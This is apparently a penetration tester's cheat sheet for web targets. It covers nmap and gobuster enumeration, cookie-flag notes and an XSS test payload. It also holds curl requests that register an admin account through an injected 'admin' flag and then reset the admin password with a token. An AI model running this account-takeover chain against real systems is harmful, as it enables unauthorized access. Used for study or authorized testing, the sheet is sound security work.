sudo nmap -p80 --script=http-enum 192.168.x.1
https://www.wappalyzer.com/
robots.txt
sitemap.xml
HttpOnly prevents JavaScript
Secure requires https, if not present we could intercept traffic.
nonce prevents CSRF

gobuster dir -u 10.0.0.1 -w /usr/share/wordlists/dirb/common.txt -t 5
# -u URL
# -w Wordlist
# -t Number of concurrent threads (default 10).

gobuster dir -u http://192.168.1.1:55 -w /usr/share/wordlists/dirb/big.txt -p pattern
# Inside pattern file we need to use {GOBUSTER}/v1 to show what part is needed to fuzz

------------XSS------------
<script>alert(42)</script>
# Simple alert test
< > ' " { } ;
# Most common chars for possible XSS
https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script

##############
## CURL
##############

# --proxy 127.0.0.1:8080 will pass it trhough burp suite

curl -d '{"password":"test1","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.1.1:55/users/v1/login
# will send json to API

curl -d '{"password":"test1","username":"admiin","email":"test@test.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.1.1:55/users/v1/register
# can try to Register a new user direct into the API, with admin flag as true

curl -d '{"password":"test1","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.1.1:55/users/v1/login
# log into the API to receive a token

curl -X 'PUT' 'http://192.168.1.1:55/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0eXAiO...aRUAsgA4' -d '{"password": "xpto"}'
# uses PUT method to change admin password, with a valid admin type token

